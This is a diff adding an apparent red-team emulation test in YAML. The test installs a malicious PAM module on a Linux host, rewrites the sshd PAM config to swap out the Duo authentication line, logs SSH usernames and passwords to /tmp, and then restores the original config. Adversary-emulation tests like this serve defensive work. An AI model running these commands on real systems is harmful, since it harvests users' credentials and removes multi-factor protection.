@@ -1,0 +1,59 @@
+---
+api_version: 2.0
+uuid: 07217ee1-9c00-41ac-8851-86e9c351f925
+name: SSH Credential Logger
+authors:
+  - hmashru
+description: |
+  SSH credential logging by updating the sshd config to use a malicious PAM module.
+  The PAM module will log the username and password to a file in /tmp/pam_test.log and only work if the user is present on the system trying to log into.
+requirements:
+  platforms:
+    - os: linux
+  superuser: true
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1056 Input Capture
+args:
+  - name: username
+    default: testuser
+  - name: password
+    default: test_password
+steps:
+  - name: checking if malicious file is present
+    inline: |
+      echo "checking if malicious file is present"
+    checks:
+      - msg: "Malicious so file is either not present or has the wrong checksum"
+        path_exists: ./mal_pam.so
+        checksum:
+          sha256: 6a8832e175e5c20cba1856e644fa927b92623b9a1bbf7a8692feabd2aae85551
+  - name: copying malicious so file to binaries folder
+    inline: |
+      cp ./mal_pam.so /lib64/security/mal_pam.so
+  - name: Backing up sshd config
+    inline: |
+      echo "Backing up sshd config"
+      sudo cp /etc/pam.d/sshd /etc/pam.d/sshd.bak
+  - name: update sshd config
+    inline: |
+      echo "update sshd config"
+      sudo sed -i 's|^auth[[:space:]]\+required[[:space:]]\+/lib64/security/pam_duo\.so|auth       required     /lib64/security/mal_pam.so|' /etc/pam.d/sshd
+      echo "updated sshd config"
+      cat /etc/pam.d/sshd
+  - name: test connection
+    inline: |
+      python3 attempt_ssh.py {{ .Args.username }} {{ .Args.password }}
+  - name: Check logs
+    inline: |
+      cat /tmp/pam_test.log
+  - name: cleanup
+    inline: |
+      sudo cp /etc/pam.d/sshd.bak /etc/pam.d/sshd
+      sudo rm /etc/pam.d/sshd.bak
+      rm /lib64/security/mal_pam.so
+      rm /tmp/pam_test.log
+      echo "Restored config"
+      cat /etc/pam.d/sshd
